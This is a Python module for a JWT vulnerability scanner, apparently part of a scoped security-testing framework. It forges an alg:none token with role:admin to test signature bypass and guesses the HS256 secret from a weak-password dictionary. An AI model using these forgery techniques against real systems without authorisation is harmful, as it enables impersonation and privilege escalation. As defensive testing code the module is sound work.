"""JWT vulnerability scanner: acceptance of alg:none and a weak HMAC secret.

Manual JWT handling (stdlib hmac/hashlib/base64) — no external dependencies.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json

from ...core.http import HttpClient
from ...core.logging import AuditLogger
from ...core.models import Evidence, Finding, Severity, Target
from ...core.scope import ActionClass, ScopeGuard

WEAK_SECRETS = ["secret", "password", "123456", "admin", "key", "jwt", "changeme",
                "secretkey", "test", "your-256-bit-secret", "supersecret", "private"]


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64url_decode(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def _sign_hs256(header_payload: str, secret: str) -> str:
    sig = hmac.new(secret.encode(), header_payload.encode(), hashlib.sha256).digest()
    return _b64url_encode(sig)


class JwtScanner:
    name = "jwt-scanner (native)"

    def __init__(self, http: HttpClient, log: AuditLogger, guard: ScopeGuard):
        self.http = http
        self.log = log
        self.guard = guard

    def scan(self, target: Target, login_endpoint: str, verify_endpoint: str,
             username: str = "admin", password: str = "password") -> list[Finding]:
        base = target.url.rstrip("/")
        self.guard.authorize(base, ActionClass.ACTIVE)
        out: list[Finding] = []

        # 1) log in and obtain a token
        r = self.http.post(f"{base}{login_endpoint}", headers={"Content-Type": "application/json"},
                          content=json.dumps({"username": username, "password": password}))
        try:
            token = json.loads(r.text).get("token")
        except (json.JSONDecodeError, AttributeError):
            token = None
        if not token or token.count(".") != 2:
            self.log.info(f"JWT: no token from {login_endpoint} — skipping")
            return out
        self.log.action(base, self.name, f"JWT obtained from {login_endpoint}")

        out += self._test_alg_none(base, verify_endpoint, token)
        out += self._test_weak_secret(base, verify_endpoint, token)
        return out

    def _test_alg_none(self, base: str, verify: str, token: str) -> list[Finding]:
        out: list[Finding] = []
        _h, p, _s = token.split(".")
        try:
            payload = json.loads(_b64url_decode(p))
        except Exception:  # noqa: BLE001
            payload = {}
        payload.update({"user": "bzjwtnone", "role": "admin"})   # escalation + marker
        header = {"alg": "none", "typ": "JWT"}
        forged = (_b64url_encode(json.dumps(header).encode()) + "." +
                  _b64url_encode(json.dumps(payload).encode()) + ".")
        r = self.http.get(f"{base}{verify}", headers={"Authorization": f"Bearer {forged}"})
        if r.status == 200 and ("bzjwtnone" in r.text or '"role": "admin"' in r.text
                                or '"role":"admin"' in r.text):
            self._report(out, Finding(
                title="JWT accepts alg:none (no signature verification)",
                severity=Severity.CRITICAL, owasp="A02:2025 Security Misconfiguration",
                cwe="CWE-347", target=f"{base}{verify}", component=verify, source_tool=self.name,
                description="The server accepts a token with the alg:none header without checking the signature — "
                            "any token can be forged (e.g. role:admin).",
                impact="Full impersonation/privilege escalation without knowing the secret.",
                recommendation="Enforce a specific algorithm (allowlist), reject alg:none.",
                reproduction=f"Send to {verify} the header: Authorization: Bearer {forged}",
                evidence=Evidence(payload=forged, response=r.text[:200])))
        return out

    def _test_weak_secret(self, base: str, verify: str, token: str) -> list[Finding]:
        out: list[Finding] = []
        try:
            h, p, s = token.split(".")
            header = json.loads(_b64url_decode(h))
        except Exception:  # noqa: BLE001
            return out
        if str(header.get("alg", "")).upper() != "HS256":
            return out
        for secret in WEAK_SECRETS:
            if hmac.compare_digest(_sign_hs256(f"{h}.{p}", secret), s):
                self._report(out, Finding(
                    title=f"Weak JWT HMAC secret ('{secret}') — token can be forged",
                    severity=Severity.CRITICAL, owasp="A02:2025 Cryptographic Failures",
                    cwe="CWE-321", target=f"{base}{verify}", component=verify, source_tool=self.name,
                    description=f"The JWT signing secret is in the dictionary ('{secret}') — "
                                "an attacker can sign any token.",
                    impact="Token forgery, privilege escalation, account takeover.",
                    recommendation="Use a random secret ≥256 bit; rotation; consider RS256/ES256.",
                    evidence=Evidence(payload=f"secret={secret}",
                                      response="signature verified with a dictionary secret")))
                break
        return out

    def _report(self, out: list[Finding], f: Finding) -> None:
        self.log.finding(f.title, f.severity.value, owasp=f.owasp)
        out.append(f)
